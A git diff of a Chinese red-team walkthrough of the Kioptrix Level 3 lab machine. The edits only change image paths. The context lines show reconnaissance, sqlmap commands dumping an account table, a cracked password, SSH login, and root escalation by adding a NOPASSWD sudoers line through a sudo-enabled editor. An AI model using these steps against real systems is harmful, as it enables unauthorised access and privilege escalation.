@@ -13,21 +13,21 @@ categories: 红队打靶-Linux
 netdiscover -i eth0 -r 192.168.137.0/24
 ```
 
-![image-20250320011732744](./././././Kioptrix%20Level3/image-20250320011732744.png)
+![image-20250320011732744](./././././././././Kioptrix%20Level3/image-20250320011732744.png)
 
 ## nmap
 
-![image-20250320011906500](./././././Kioptrix%20Level3/image-20250320011906500.png)
+![image-20250320011906500](./././././././././Kioptrix%20Level3/image-20250320011906500.png)
 
 # WEB服务
 
-![image-20250320014612476](./././././Kioptrix%20Level3/image-20250320014612476.png)
+![image-20250320014612476](./././././././././Kioptrix%20Level3/image-20250320014612476.png)
 
 在此页面点击图片跳转到的是kioptrix3.com，将域名解析添加到/etc/hosts中去就可以正常显示图片
 
-![image-20250320014937046](./././././Kioptrix%20Level3/image-20250320014937046.png)
+![image-20250320014937046](./././././././././Kioptrix%20Level3/image-20250320014937046.png)
 
-当前页面有个排序功能，尝试对id进行sql注入![image-20250320015113210](./././././Kioptrix%20Level3/image-20250320015113210.png)
+当前页面有个排序功能，尝试对id进行sql注入![image-20250320015113210](./././././././././Kioptrix%20Level3/image-20250320015113210.png)
 
 出现保存，说明存在注入点，手注测试之后为数字型闭合
 
@@ -85,25 +85,25 @@ loneferret~5badcaf789d3d1d09794d8f021f40f0e(starwars)
 sqlmap -r sql --batch --dbs -p id
 ```
 
-![image-20250320021618540](./././././Kioptrix%20Level3/image-20250320021618540.png)
+![image-20250320021618540](./././././././././Kioptrix%20Level3/image-20250320021618540.png)
 
 ```
 sqlmap -r sql --batch -D gallery --tables -p id
 ```
 
-![image-20250320021634279](./././././Kioptrix%20Level3/image-20250320021634279.png)
+![image-20250320021634279](./././././././././Kioptrix%20Level3/image-20250320021634279.png)
 
 ```
 sqlmap -r sql --batch -D gallery -T dev_accounts --columns -p id
 ```
 
-![image-20250320021806341](./././././Kioptrix%20Level3/image-20250320021806341.png)
+![image-20250320021806341](./././././././././Kioptrix%20Level3/image-20250320021806341.png)
 
 ```
 sqlmap -r sql --batch -D gallery -T dev_accounts -C username,password -p id --dump
 ```
 
-![image-20250320021851115](./././././Kioptrix%20Level3/image-20250320021851115.png)
+![image-20250320021851115](./././././././././Kioptrix%20Level3/image-20250320021851115.png)
 
 ## ssh连接
 
@@ -115,13 +115,13 @@ ssh loneferret@192.168.137.133  -oHostKeyAlgorithms=+ssh-rsa
 
 loneferret用户目录下有checksec.sh和CompanyPolic.README
 
-![image-20250320022424144](./././././Kioptrix%20Level3/image-20250320022424144.png)
+![image-20250320022424144](./././././././././Kioptrix%20Level3/image-20250320022424144.png)
 
 意思就是使用ht编辑器来编辑文档，ht编辑器有sudo权限
 
 那么就只需要在/etc/sudoers中加入该用户就可以了
 
-![image-20250320022816840](./././././Kioptrix%20Level3/image-20250320022816840.png)
+![image-20250320022816840](./././././././././Kioptrix%20Level3/image-20250320022816840.png)
 
 解决方法
 
@@ -133,7 +133,7 @@ echo $TERM
 
 ht编辑器最下面这行分别对应F1-F10，搜索/etc/sudoers/进行编辑
 
-![image-20250320023044704](./././././Kioptrix%20Level3/image-20250320023044704.png)
+![image-20250320023044704](./././././././././Kioptrix%20Level3/image-20250320023044704.png)
 
 添加
 
@@ -143,5 +143,5 @@ loneferretALL=(ALL) NOPASSWD:ALL
 
 即可成功提权
 
-![image-20250320023340077](./././././Kioptrix%20Level3/image-20250320023340077.png)
+![image-20250320023340077](./././././././././Kioptrix%20Level3/image-20250320023340077.png)
 
